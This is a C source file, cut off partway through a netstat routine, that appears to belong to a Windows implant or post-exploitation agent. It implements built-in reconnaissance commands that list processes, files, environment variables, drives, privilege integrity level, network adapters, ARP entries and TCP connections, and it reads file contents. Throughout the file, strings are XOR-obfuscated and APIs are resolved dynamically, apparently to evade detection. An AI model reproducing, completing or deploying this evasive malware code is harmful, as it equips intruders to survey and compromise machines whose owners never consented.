#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <tcpmib.h>
#include <windns.h>
#include <lm.h>
#include <winsvc.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "builtin.h"
#include "obf.h"
#include "obf_strings.h"
#include "../../include/dynapi.h"

/* ------------------------------------------------------------------ */
/* ls / dir                                                             */
/* ------------------------------------------------------------------ */
static void builtin_ls(const char *arg, char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    char pattern[MAX_PATH];
    if (!arg || arg[0] == '\0') {
        char _dw[ENC_DIR_WILDCARD_LEN + 1]; xor_dec(_dw, ENC_DIR_WILDCARD, ENC_DIR_WILDCARD_LEN);
        _snprintf(pattern, sizeof(pattern) - 1, "%s", _dw);
    } else {
        size_t len = strlen(arg);
        if (len == 0 || arg[len - 1] == '\\' || arg[len - 1] == '/') {
            char _ds[ENC_DIR_FMT_STAR_LEN + 1]; xor_dec(_ds, ENC_DIR_FMT_STAR, ENC_DIR_FMT_STAR_LEN);
            _snprintf(pattern, sizeof(pattern) - 1, _ds, arg);
        } else if (strchr(arg, '*') || strchr(arg, '?'))
            _snprintf(pattern, sizeof(pattern) - 1, "%s", arg);
        else {
            char _dbs[ENC_DIR_FMT_BSLASH_STAR_LEN + 1]; xor_dec(_dbs, ENC_DIR_FMT_BSLASH_STAR, ENC_DIR_FMT_BSLASH_STAR_LEN);
            _snprintf(pattern, sizeof(pattern) - 1, _dbs, arg);
        }
    }

    WIN32_FIND_DATAA fd;
    HANDLE h = fnFindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        char _ea[ENC_LS_ERR_ACCESS_LEN + 1]; xor_dec(_ea, ENC_LS_ERR_ACCESS, ENC_LS_ERR_ACCESS_LEN);
        _snprintf(out, size - 1, _ea, pattern, fnGetLastError());
        return;
    }
    char _td[ENC_LS_TAG_DIR_LEN + 1];  xor_dec(_td, ENC_LS_TAG_DIR,  ENC_LS_TAG_DIR_LEN);
    char _tf[ENC_LS_TAG_FILE_LEN + 1]; xor_dec(_tf, ENC_LS_TAG_FILE, ENC_LS_TAG_FILE_LEN);
    char _dot[ENC_DOT_LEN + 1];        xor_dec(_dot,    ENC_DOT,    ENC_DOT_LEN);
    char _dotdot[ENC_DOTDOT_LEN + 1];  xor_dec(_dotdot, ENC_DOTDOT, ENC_DOTDOT_LEN);
    int pos = 0;
    do {
        if (strcmp(fd.cFileName, _dot) == 0 || strcmp(fd.cFileName, _dotdot) == 0)
            continue;
        const char *tag = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? _td : _tf;
        char _rf[ENC_LS_ROW_FMT_LEN + 1]; xor_dec(_rf, ENC_LS_ROW_FMT, ENC_LS_ROW_FMT_LEN);
        char line[512];
        int n = _snprintf(line, sizeof(line) - 1, _rf, tag, fd.cFileName);
        if (n > 0 && pos + n < size - 1) { memcpy(out + pos, line, (size_t)n); pos += n; }
    } while (fnFindNextFileA(h, &fd));
    fnFindClose(h);
    out[pos] = '\0';
}

/* ------------------------------------------------------------------ */
/* ps                                                                   */
/* ------------------------------------------------------------------ */
static void builtin_ps(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    HANDLE snap = fnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        char _pe[ENC_PS_ERR_SNAP_LEN + 1]; xor_dec(_pe, ENC_PS_ERR_SNAP, ENC_PS_ERR_SNAP_LEN);
        _snprintf(out, size - 1, _pe, fnGetLastError());
        return;
    }
    char _phf[ENC_PS_HDR_FMT_LEN + 1];  xor_dec(_phf, ENC_PS_HDR_FMT,  ENC_PS_HDR_FMT_LEN);
    char _pid[ENC_PS_HDR_PID_LEN + 1];  xor_dec(_pid, ENC_PS_HDR_PID,  ENC_PS_HDR_PID_LEN);
    char _pnm[ENC_PS_HDR_NAME_LEN + 1]; xor_dec(_pnm, ENC_PS_HDR_NAME, ENC_PS_HDR_NAME_LEN);
    char _ppp[ENC_PS_HDR_PPID_LEN + 1]; xor_dec(_ppp, ENC_PS_HDR_PPID, ENC_PS_HDR_PPID_LEN);
    char _pd1[ENC_PS_HDR_DIV1_LEN + 1]; xor_dec(_pd1, ENC_PS_HDR_DIV1, ENC_PS_HDR_DIV1_LEN);
    char _pd2[ENC_PS_HDR_DIV2_LEN + 1]; xor_dec(_pd2, ENC_PS_HDR_DIV2, ENC_PS_HDR_DIV2_LEN);
    char _pd3[ENC_PS_HDR_DIV3_LEN + 1]; xor_dec(_pd3, ENC_PS_HDR_DIV3, ENC_PS_HDR_DIV3_LEN);
    char _prf[ENC_PS_ROW_FMT_LEN + 1];  xor_dec(_prf, ENC_PS_ROW_FMT,  ENC_PS_ROW_FMT_LEN);
    int pos = 0;
    int n = _snprintf(out + pos, size - pos - 1, _phf,
                      _pid, _pnm, _ppp, _pd1, _pd2, _pd3);
    if (n > 0) pos += n;

    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (fnProcess32First(snap, &pe)) {
        do {
            n = _snprintf(out + pos, size - pos - 1, _prf,
                          (unsigned long)pe.th32ProcessID,
                          pe.szExeFile,
                          (unsigned long)pe.th32ParentProcessID);
            if (n > 0 && pos + n < size - 1) pos += n;
        } while (fnProcess32Next(snap, &pe));
    }
    fnCloseHandle2(snap);
    out[pos] = '\0';
}

/* ------------------------------------------------------------------ */
/* cat                                                                  */
/* ------------------------------------------------------------------ */
static void builtin_cat(const char *path, char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    if (!path || path[0] == '\0') {
        char _cm[ENC_CAT_ERR_MISSING_LEN + 1]; xor_dec(_cm, ENC_CAT_ERR_MISSING, ENC_CAT_ERR_MISSING_LEN);
        _snprintf(out, size - 1, "%s", _cm); return;
    }
    HANDLE h = fnCreateFileA2(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        char _co[ENC_CAT_ERR_OPEN_LEN + 1]; xor_dec(_co, ENC_CAT_ERR_OPEN, ENC_CAT_ERR_OPEN_LEN);
        _snprintf(out, size - 1, _co, path, fnGetLastError()); return;
    }
    DWORD bytes_read = 0;
    fnReadFile(h, out, (DWORD)(size - 1), &bytes_read, NULL);
    out[bytes_read] = '\0';
    fnCloseHandle2(h);
}

/* ------------------------------------------------------------------ */
/* stat                                                                 */
/* ------------------------------------------------------------------ */
static void builtin_stat(const char *path, char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    if (!path || path[0] == '\0') {
        char _sm[ENC_STAT_ERR_MISSING_LEN + 1]; xor_dec(_sm, ENC_STAT_ERR_MISSING, ENC_STAT_ERR_MISSING_LEN);
        _snprintf(out, size - 1, "%s", _sm); return;
    }
    WIN32_FILE_ATTRIBUTE_DATA fa;
    if (!fnGetFileAttributesExA(path, GetFileExInfoStandard, &fa)) {
        char _snf[ENC_STAT_ERR_NOTFOUND_LEN + 1]; xor_dec(_snf, ENC_STAT_ERR_NOTFOUND, ENC_STAT_ERR_NOTFOUND_LEN);
        _snprintf(out, size - 1, _snf, path, fnGetLastError()); return;
    }
    LARGE_INTEGER sz; sz.HighPart = (LONG)fa.nFileSizeHigh; sz.LowPart = fa.nFileSizeLow;
    SYSTEMTIME ct, mt, at;
    fnFileTimeToSystemTime(&fa.ftCreationTime,   &ct);
    fnFileTimeToSystemTime(&fa.ftLastWriteTime,  &mt);
    fnFileTimeToSystemTime(&fa.ftLastAccessTime, &at);
    char _sdir[ENC_STAT_TYPE_DIR_LEN + 1];  xor_dec(_sdir, ENC_STAT_TYPE_DIR,  ENC_STAT_TYPE_DIR_LEN);
    char _sfil[ENC_STAT_TYPE_FILE_LEN + 1]; xor_dec(_sfil, ENC_STAT_TYPE_FILE, ENC_STAT_TYPE_FILE_LEN);
    const char *type = (fa.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? _sdir : _sfil;
    char _sfmt[ENC_STAT_FMT_LEN + 1]; xor_dec(_sfmt, ENC_STAT_FMT, ENC_STAT_FMT_LEN);
    _snprintf(out, size - 1, _sfmt,
        path, type, (long long)sz.QuadPart,
        ct.wYear, ct.wMonth, ct.wDay, ct.wHour, ct.wMinute, ct.wSecond,
        mt.wYear, mt.wMonth, mt.wDay, mt.wHour, mt.wMinute, mt.wSecond,
        at.wYear, at.wMonth, at.wDay, at.wHour, at.wMinute, at.wSecond);
}

/* ------------------------------------------------------------------ */
/* cd                                                                   */
/* ------------------------------------------------------------------ */
static void builtin_cd(const char *path, char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    if (!path || path[0] == '\0') {
        fnGetCurrentDirectoryA(size - 1, out); return;
    }
    if (!fnSetCurrentDirectoryA(path)) {
        char _ce[ENC_CD_ERR_CHDIR_LEN + 1]; xor_dec(_ce, ENC_CD_ERR_CHDIR, ENC_CD_ERR_CHDIR_LEN);
        _snprintf(out, size - 1, _ce, path, fnGetLastError());
    } else {
        char cwd[MAX_PATH];
        fnGetCurrentDirectoryA(sizeof(cwd) - 1, cwd);
        _snprintf(out, size - 1, "%s\r\n", cwd);
    }
}

/* ------------------------------------------------------------------ */
/* sysinfo                                                              */
/* ------------------------------------------------------------------ */
static void builtin_sysinfo(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    char _pd[ENC_SYSINFO_PRODUCT_DEFAULT_LEN + 1]; xor_dec(_pd, ENC_SYSINFO_PRODUCT_DEFAULT, ENC_SYSINFO_PRODUCT_DEFAULT_LEN);
    char product[256]; memcpy(product, _pd, ENC_SYSINFO_PRODUCT_DEFAULT_LEN + 1);
    char build[32] = "?";
    HKEY hk;
    char _rk[ENC_SYSINFO_REGKEY_LEN + 1]; xor_dec(_rk, ENC_SYSINFO_REGKEY, ENC_SYSINFO_REGKEY_LEN);
    if (fnRegOpenKeyExA(HKEY_LOCAL_MACHINE, _rk, 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        char _rpn[ENC_SYSINFO_REGVAL_PRODUCT_LEN + 1]; xor_dec(_rpn, ENC_SYSINFO_REGVAL_PRODUCT, ENC_SYSINFO_REGVAL_PRODUCT_LEN);
        DWORD sz = sizeof(product);
        fnRegQueryValueExA(hk, _rpn, NULL, NULL, (LPBYTE)product, &sz);
        char _rbn[ENC_SYSINFO_REGVAL_BUILD_LEN + 1]; xor_dec(_rbn, ENC_SYSINFO_REGVAL_BUILD, ENC_SYSINFO_REGVAL_BUILD_LEN);
        sz = sizeof(build);
        fnRegQueryValueExA(hk, _rbn, NULL, NULL, (LPBYTE)build, &sz);
        fnRegCloseKey(hk);
    }
    SYSTEM_INFO si; fnGetNativeSystemInfo(&si);
    char _ax64[ENC_SYSINFO_ARCH_X64_LEN + 1]; xor_dec(_ax64, ENC_SYSINFO_ARCH_X64, ENC_SYSINFO_ARCH_X64_LEN);
    char _ax86[ENC_SYSINFO_ARCH_X86_LEN + 1]; xor_dec(_ax86, ENC_SYSINFO_ARCH_X86, ENC_SYSINFO_ARCH_X86_LEN);
    char _aunk[ENC_SYSINFO_ARCH_UNK_LEN + 1]; xor_dec(_aunk, ENC_SYSINFO_ARCH_UNK, ENC_SYSINFO_ARCH_UNK_LEN);
    const char *arch = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? _ax64 :
                       (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)  ? _ax86 : _aunk;
    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms); fnGlobalMemoryStatusEx(&ms);
    unsigned long total_mb = (unsigned long)(ms.ullTotalPhys  / (1024ULL * 1024));
    unsigned long avail_mb = (unsigned long)(ms.ullAvailPhys  / (1024ULL * 1024));
    char hostname[256] = {0}, username[256] = {0};
    DWORD hsz = sizeof(hostname) - 1, usz = sizeof(username) - 1;
    fnGetComputerNameA(hostname, &hsz);
    fnGetUserNameA(username, &usz);
    char _sfmt[ENC_SYSINFO_FMT_LEN + 1]; xor_dec(_sfmt, ENC_SYSINFO_FMT, ENC_SYSINFO_FMT_LEN);
    _snprintf(out, size - 1, _sfmt, product, build, arch, total_mb, avail_mb, hostname, username);
}

/* ------------------------------------------------------------------ */
/* drives                                                               */
/* ------------------------------------------------------------------ */
static void builtin_drives(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    char buf[256] = {0};
    if (fnGetLogicalDriveStringsA((DWORD)(sizeof(buf) - 1), buf) == 0) {
        char _de[ENC_DRIVES_ERR_LEN + 1]; xor_dec(_de, ENC_DRIVES_ERR, ENC_DRIVES_ERR_LEN);
        _snprintf(out, size - 1, _de, fnGetLastError()); return;
    }
    char _dfx[ENC_DRIVES_FIXED_LEN + 1];    xor_dec(_dfx, ENC_DRIVES_FIXED,    ENC_DRIVES_FIXED_LEN);
    char _drm[ENC_DRIVES_REMOVABLE_LEN + 1]; xor_dec(_drm, ENC_DRIVES_REMOVABLE,ENC_DRIVES_REMOVABLE_LEN);
    char _dnt[ENC_DRIVES_NETWORK_LEN + 1];  xor_dec(_dnt, ENC_DRIVES_NETWORK,  ENC_DRIVES_NETWORK_LEN);
    char _dcd[ENC_DRIVES_CDROM_LEN + 1];    xor_dec(_dcd, ENC_DRIVES_CDROM,    ENC_DRIVES_CDROM_LEN);
    char _drm2[ENC_DRIVES_RAM_LEN + 1];     xor_dec(_drm2,ENC_DRIVES_RAM,      ENC_DRIVES_RAM_LEN);
    char _duk[ENC_DRIVES_UNKNOWN_LEN + 1];  xor_dec(_duk, ENC_DRIVES_UNKNOWN,  ENC_DRIVES_UNKNOWN_LEN);
    char _dsp[ENC_DRIVES_SPACE_FMT_LEN + 1];xor_dec(_dsp, ENC_DRIVES_SPACE_FMT,ENC_DRIVES_SPACE_FMT_LEN);
    char _drf[ENC_DRIVES_ROW_FMT_LEN + 1];  xor_dec(_drf, ENC_DRIVES_ROW_FMT,  ENC_DRIVES_ROW_FMT_LEN);
    int pos = 0;
    for (const char *p = buf; *p; p += strlen(p) + 1) {
        UINT type = fnGetDriveTypeA(p);
        const char *tname = (type == DRIVE_FIXED)    ? _dfx  :
                            (type == DRIVE_REMOVABLE) ? _drm  :
                            (type == DRIVE_REMOTE)    ? _dnt  :
                            (type == DRIVE_CDROM)     ? _dcd  :
                            (type == DRIVE_RAMDISK)   ? _drm2 : _duk;
        char space[64] = "";
        ULARGE_INTEGER free_b, total_b, free_total;
        if (fnGetDiskFreeSpaceExA(p, &free_b, &total_b, &free_total)) {
            _snprintf(space, sizeof(space) - 1, _dsp,
                      (unsigned long)(total_b.QuadPart / (1024ULL*1024*1024)),
                      (unsigned long)(free_b.QuadPart  / (1024ULL*1024*1024)));
        }
        int n = _snprintf(out + pos, size - pos - 1, _drf, p, tname, space);
        if (n > 0 && pos + n < size - 1) pos += n;
    }
    out[pos] = '\0';
}

/* ------------------------------------------------------------------ */
/* getintegrity                                                         */
/* ------------------------------------------------------------------ */
static void builtin_getintegrity(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    HANDLE hToken = NULL;
    if (!fnOpenProcessToken(fnGetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        char _ie[ENC_INTEG_ERR_LEN + 1]; xor_dec(_ie, ENC_INTEG_ERR, ENC_INTEG_ERR_LEN);
        _snprintf(out, size - 1, _ie, fnGetLastError()); return;
    }
    DWORD sz = 0;
    fnGetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &sz);
    TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)fnLocalAlloc(LPTR, sz);
    if (!tml) {
        fnCloseHandle2(hToken);
        char _ia[ENC_INTEG_ERR_ALLOC_LEN + 1]; xor_dec(_ia, ENC_INTEG_ERR_ALLOC, ENC_INTEG_ERR_ALLOC_LEN);
        _snprintf(out, size - 1, "%s", _ia); return;
    }
    fnGetTokenInformation(hToken, TokenIntegrityLevel, tml, sz, &sz);
    DWORD rid = *fnGetSidSubAuthority(tml->Label.Sid,
                                    *fnGetSidSubAuthorityCount(tml->Label.Sid) - 1);
    fnLocalFree(tml); fnCloseHandle2(hToken);
    char _isys[ENC_INTEG_SYSTEM_LEN + 1]; xor_dec(_isys, ENC_INTEG_SYSTEM, ENC_INTEG_SYSTEM_LEN);
    char _ihi[ENC_INTEG_HIGH_LEN + 1];    xor_dec(_ihi,  ENC_INTEG_HIGH,   ENC_INTEG_HIGH_LEN);
    char _imed[ENC_INTEG_MEDIUM_LEN + 1]; xor_dec(_imed, ENC_INTEG_MEDIUM, ENC_INTEG_MEDIUM_LEN);
    char _ilow[ENC_INTEG_LOW_LEN + 1];    xor_dec(_ilow, ENC_INTEG_LOW,    ENC_INTEG_LOW_LEN);
    const char *level = (rid >= SECURITY_MANDATORY_SYSTEM_RID) ? _isys :
                        (rid >= SECURITY_MANDATORY_HIGH_RID)   ? _ihi  :
                        (rid >= SECURITY_MANDATORY_MEDIUM_RID) ? _imed : _ilow;
    char _ifmt[ENC_INTEG_FMT_LEN + 1]; xor_dec(_ifmt, ENC_INTEG_FMT, ENC_INTEG_FMT_LEN);
    _snprintf(out, size - 1, _ifmt, level, (unsigned long)rid);
}

/* ------------------------------------------------------------------ */
/* env                                                                  */
/* ------------------------------------------------------------------ */
static void builtin_env(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    LPCH env = fnGetEnvironmentStringsA();
    if (!env) return;
    int pos = 0;
    for (const char *p = env; *p; p += strlen(p) + 1) {
        size_t len = strlen(p);
        if (pos + (int)len + 3 >= size - 1) break;
        memcpy(out + pos, p, len);
        pos += (int)len;
        out[pos++] = '\r'; out[pos++] = '\n';
    }
    out[pos] = '\0';
    fnFreeEnvironmentStringsA(env);
}

/* ------------------------------------------------------------------ */
/* ipconfig                                                             */
/* ------------------------------------------------------------------ */
static void builtin_ipconfig(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    ULONG buflen = 15000;
    IP_ADAPTER_ADDRESSES *addrs = (IP_ADAPTER_ADDRESSES *)fnLocalAlloc(LPTR, buflen);
    if (!addrs) return;
    ULONG ret = fnGetAdaptersAddresses(AF_UNSPEC,
                    GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST |
                    GAA_FLAG_SKIP_DNS_SERVER,
                    NULL, addrs, &buflen);
    if (ret == ERROR_BUFFER_OVERFLOW) {
        fnLocalFree(addrs);
        addrs = (IP_ADAPTER_ADDRESSES *)fnLocalAlloc(LPTR, buflen);
        if (!addrs) return;
        ret = fnGetAdaptersAddresses(AF_UNSPEC,
                    GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST |
                    GAA_FLAG_SKIP_DNS_SERVER,
                    NULL, addrs, &buflen);
    }
    if (ret != NO_ERROR) {
        char _ice[ENC_IPCONFIG_ERR_LEN + 1]; xor_dec(_ice, ENC_IPCONFIG_ERR, ENC_IPCONFIG_ERR_LEN);
        _snprintf(out, size - 1, _ice, ret);
        fnLocalFree(addrs); return;
    }
    char _iad[ENC_IPCONFIG_ADAPTER_LEN + 1]; xor_dec(_iad, ENC_IPCONFIG_ADAPTER, ENC_IPCONFIG_ADAPTER_LEN);
    char _i4[ENC_IPCONFIG_IPV4_LEN + 1];     xor_dec(_i4,  ENC_IPCONFIG_IPV4,    ENC_IPCONFIG_IPV4_LEN);
    char _i6[ENC_IPCONFIG_IPV6_LEN + 1];     xor_dec(_i6,  ENC_IPCONFIG_IPV6,    ENC_IPCONFIG_IPV6_LEN);
    int pos = 0;
    for (IP_ADAPTER_ADDRESSES *a = addrs; a; a = a->Next) {
        if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;
        char friendly[256] = {0};
        fnWideCharToMultiByte(CP_ACP, 0, a->FriendlyName, -1,
                             friendly, sizeof(friendly) - 1, NULL, NULL);
        int n = _snprintf(out + pos, size - pos - 1, _iad, friendly);
        if (n > 0 && pos + n < size - 1) pos += n;
        for (IP_ADAPTER_UNICAST_ADDRESS *ua = a->FirstUnicastAddress; ua; ua = ua->Next) {
            struct sockaddr *sa = ua->Address.lpSockaddr;
            if (sa->sa_family == AF_INET) {
                unsigned char *b = (unsigned char *)&((struct sockaddr_in *)sa)->sin_addr;
                n = _snprintf(out + pos, size - pos - 1, _i4, b[0], b[1], b[2], b[3]);
                if (n > 0 && pos + n < size - 1) pos += n;
            } else if (sa->sa_family == AF_INET6) {
                unsigned char *b = (unsigned char *)
                    &((struct sockaddr_in6 *)sa)->sin6_addr;
                n = _snprintf(out + pos, size - pos - 1, _i6,
                    b[0],b[1],b[2],b[3],b[4],b[5],b[6],b[7],
                    b[8],b[9],b[10],b[11],b[12],b[13],b[14],b[15]);
                if (n > 0 && pos + n < size - 1) pos += n;
            }
        }
    }
    out[pos] = '\0';
    fnLocalFree(addrs);
}

/* ------------------------------------------------------------------ */
/* arp                                                                  */
/* ------------------------------------------------------------------ */
static void builtin_arp(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    ULONG buflen = 0;
    fnGetIpNetTable(NULL, &buflen, FALSE);
    PMIB_IPNETTABLE table = (PMIB_IPNETTABLE)fnLocalAlloc(LPTR, buflen);
    if (!table) return;
    if (fnGetIpNetTable(table, &buflen, FALSE) != NO_ERROR) {
        fnLocalFree(table);
        char _ae[ENC_ARP_ERR_LEN + 1]; xor_dec(_ae, ENC_ARP_ERR, ENC_ARP_ERR_LEN);
        _snprintf(out, size - 1, "%s", _ae); return;
    }
    char _ahf[ENC_ARP_HDR_FMT_LEN + 1];  xor_dec(_ahf,  ENC_ARP_HDR_FMT,  ENC_ARP_HDR_FMT_LEN);
    char _ahip[ENC_ARP_HDR_IP_LEN + 1];   xor_dec(_ahip, ENC_ARP_HDR_IP,   ENC_ARP_HDR_IP_LEN);
    char _ahmc[ENC_ARP_HDR_MAC_LEN + 1];  xor_dec(_ahmc, ENC_ARP_HDR_MAC,  ENC_ARP_HDR_MAC_LEN);
    char _aht[ENC_ARP_HDR_TYPE_LEN + 1];  xor_dec(_aht,  ENC_ARP_HDR_TYPE, ENC_ARP_HDR_TYPE_LEN);
    char _ahd1[ENC_ARP_HDR_DIV1_LEN + 1]; xor_dec(_ahd1, ENC_ARP_HDR_DIV1, ENC_ARP_HDR_DIV1_LEN);
    char _ahd2[ENC_ARP_HDR_DIV2_LEN + 1]; xor_dec(_ahd2, ENC_ARP_HDR_DIV2, ENC_ARP_HDR_DIV2_LEN);
    char _ahd3[ENC_ARP_HDR_DIV3_LEN + 1]; xor_dec(_ahd3, ENC_ARP_HDR_DIV3, ENC_ARP_HDR_DIV3_LEN);
    char _adyn[ENC_ARP_DYNAMIC_LEN + 1];  xor_dec(_adyn, ENC_ARP_DYNAMIC,  ENC_ARP_DYNAMIC_LEN);
    char _ast[ENC_ARP_STATIC_LEN + 1];    xor_dec(_ast,  ENC_ARP_STATIC,   ENC_ARP_STATIC_LEN);
    char _aot[ENC_ARP_OTHER_LEN + 1];     xor_dec(_aot,  ENC_ARP_OTHER,    ENC_ARP_OTHER_LEN);
    char _ainv[ENC_ARP_INVALID_LEN + 1];  xor_dec(_ainv, ENC_ARP_INVALID,  ENC_ARP_INVALID_LEN);
    char _arf[ENC_ARP_ROW_FMT_LEN + 1];   xor_dec(_arf,  ENC_ARP_ROW_FMT,  ENC_ARP_ROW_FMT_LEN);
    int pos = _snprintf(out, size - 1, _ahf,
        _ahip, _ahmc, _aht, _ahd1, _ahd2, _ahd3);
    if (pos < 0) pos = 0;
    for (DWORD i = 0; i < table->dwNumEntries; i++) {
        MIB_IPNETROW *row = &table->table[i];
        unsigned char *ip = (unsigned char *)&row->dwAddr;
        char ip_s[20], mac_s[24];
        char _aip[ENC_ARP_IP_FMT_LEN + 1];  xor_dec(_aip, ENC_ARP_IP_FMT,  ENC_ARP_IP_FMT_LEN);
        char _amc[ENC_ARP_MAC_FMT_LEN + 1]; xor_dec(_amc, ENC_ARP_MAC_FMT, ENC_ARP_MAC_FMT_LEN);
        _snprintf(ip_s,  sizeof(ip_s)  - 1, _aip, ip[0],ip[1],ip[2],ip[3]);
        _snprintf(mac_s, sizeof(mac_s) - 1, _amc,
                  row->bPhysAddr[0], row->bPhysAddr[1], row->bPhysAddr[2],
                  row->bPhysAddr[3], row->bPhysAddr[4], row->bPhysAddr[5]);
        const char *type = (row->dwType == MIB_IPNET_TYPE_DYNAMIC) ? _adyn :
                           (row->dwType == MIB_IPNET_TYPE_STATIC)  ? _ast  :
                           (row->dwType == MIB_IPNET_TYPE_OTHER)   ? _aot  : _ainv;
        int n = _snprintf(out + pos, size - pos - 1, _arf, ip_s, mac_s, type);
        if (n > 0 && pos + n < size - 1) pos += n;
    }
    out[pos] = '\0';
    fnLocalFree(table);
}

/* ------------------------------------------------------------------ */
/* cp / mv: parse "cmd src dst" — src is first token, dst is the rest  */
/* ------------------------------------------------------------------ */
static int split_two_args(const char *args, char *a, int asz, char *b, int bsz) {
    const char *sp = strchr(args, ' ');
    if (!sp) return 0;
    size_t alen = (size_t)(sp - args);
    if (alen >= (size_t)asz) alen = (size_t)asz - 1;
    memcpy(a, args, alen); a[alen] = '\0';
    _snprintf(b, bsz - 1, "%s", sp + 1);
    return 1;
}

/* ------------------------------------------------------------------ */
/* netstat                                                              */
/* ------------------------------------------------------------------ */
static void tcp_state_str(DWORD s, char *buf, int bsz) {
    const unsigned char *enc; int len;
    switch (s) {
        case MIB_TCP_STATE_LISTEN:     enc = ENC_TCP_STATE_LISTEN;      len = ENC_TCP_STATE_LISTEN_LEN;      break;
        case MIB_TCP_STATE_SYN_SENT:   enc = ENC_TCP_STATE_SYN_SENT;    len = ENC_TCP_STATE_SYN_SENT_LEN;    break;
        case MIB_TCP_STATE_SYN_RCVD:   enc = ENC_TCP_STATE_SYN_RCVD;    len = ENC_TCP_STATE_SYN_RCVD_LEN;    break;
        case MIB_TCP_STATE_ESTAB:      enc = ENC_TCP_STATE_ESTABLISHED;  len = ENC_TCP_STATE_ESTABLISHED_LEN; break;
        case MIB_TCP_STATE_FIN_WAIT1:  enc = ENC_TCP_STATE_FIN_WAIT1;   len = ENC_TCP_STATE_FIN_WAIT1_LEN;   break;
        case MIB_TCP_STATE_FIN_WAIT2:  enc = ENC_TCP_STATE_FIN_WAIT2;   len = ENC_TCP_STATE_FIN_WAIT2_LEN;   break;
        case MIB_TCP_STATE_CLOSE_WAIT: enc = ENC_TCP_STATE_CLOSE_WAIT;  len = ENC_TCP_STATE_CLOSE_WAIT_LEN;  break;
        case MIB_TCP_STATE_CLOSING:    enc = ENC_TCP_STATE_CLOSING;      len = ENC_TCP_STATE_CLOSING_LEN;     break;
        case MIB_TCP_STATE_LAST_ACK:   enc = ENC_TCP_STATE_LAST_ACK;    len = ENC_TCP_STATE_LAST_ACK_LEN;    break;
        case MIB_TCP_STATE_TIME_WAIT:  enc = ENC_TCP_STATE_TIME_WAIT;   len = ENC_TCP_STATE_TIME_WAIT_LEN;   break;
        default:                       enc = ENC_TCP_STATE_UNKNOWN;      len = ENC_TCP_STATE_UNKNOWN_LEN;     break;
    }
    if (len + 1 <= bsz) { xor_dec(buf, enc, len); buf[len] = '\0'; }
    else if (bsz > 0) buf[0] = '\0';
}

static void builtin_netstat(char *out, int size) {
    if (size > 0) out[size - 1] = '\0';
    char _nhf[ENC_NETSTAT_HDR_FMT_LEN + 1];    xor_dec(_nhf,  ENC_NETSTAT_HDR_FMT,    ENC_NETSTAT_HDR_FMT_LEN);
    char _nhl[ENC_NETSTAT_HDR_LOCAL_LEN + 1];   xor_dec(_nhl,  ENC_NETSTAT_HDR_LOCAL,  ENC_NETSTAT_HDR_LOCAL_LEN);
    char _nhr[ENC_NETSTAT_HDR_REMOTE_LEN + 1];  xor_dec(_nhr,  ENC_NETSTAT_HDR_REMOTE, ENC_NETSTAT_HDR_REMOTE_LEN);
    char _nhs[ENC_NETSTAT_HDR_STATE_LEN + 1];   xor_dec(_nhs,  ENC_NETSTAT_HDR_STATE,  ENC_NETSTAT_HDR_STATE_LEN);
    char _ntf[ENC_NETSTAT_TCP_FMT_LEN + 1];     xor_dec(_ntf,  ENC_NETSTAT_TCP_FMT,    ENC_NETSTAT_TCP_FMT_LEN);
    char _nuf[ENC_NETSTAT_UDP_FMT_LEN + 1];     xor_dec(_nuf,  ENC_NETSTAT_UDP_FMT,    ENC_NETSTAT_UDP_FMT_LEN);
    char _nus[ENC_NETSTAT_UDP_STAR_LEN + 1];    xor_dec(_nus,  ENC_NETSTAT_UDP_STAR,   ENC_NETSTAT_UDP_STAR_LEN);
    int pos = 0;
    int n = _snprintf(out + pos, size - pos - 1, _nhf, _nhl, _nhr, _nhs);
    if (n > 0 && pos + n < size - 1) pos += n;

    /* TCP */
    DWORD tcp_sz = 0;
    fnGetExtendedTcpTable(NULL, &tcp_sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    MIB_TCPTABLE_OWNER_PID *tcp_tbl = (MIB_TCPTABLE_OWNER_PID *)fnLocalAlloc(LPTR, tcp_sz);
    if (tcp_tbl) {
        if (fnGetExtendedTcpTable(tcp_tbl, &tcp_sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
            for (DWORD i = 0; i < tcp_tbl->dwNumEntries; i++) {
                MIB_TCPROW_OWNER_PID *row = &tcp_tbl->table[i];
                unsigned char *lip = (unsigned char *)&row->dwLocalAddr;
                unsigned char *rip = (unsigned char *)&row->dwRemoteAddr;
                char local[32], remote[32], state[16];
                char _naf[ENC_NETSTAT_ADDR_FMT_LEN + 1]; xor_dec(_naf, ENC_NETSTAT_ADDR_FMT, ENC_NETSTAT_ADDR_FMT_LEN);
                _snprintf(local,  sizeof(local)  - 1, _naf,
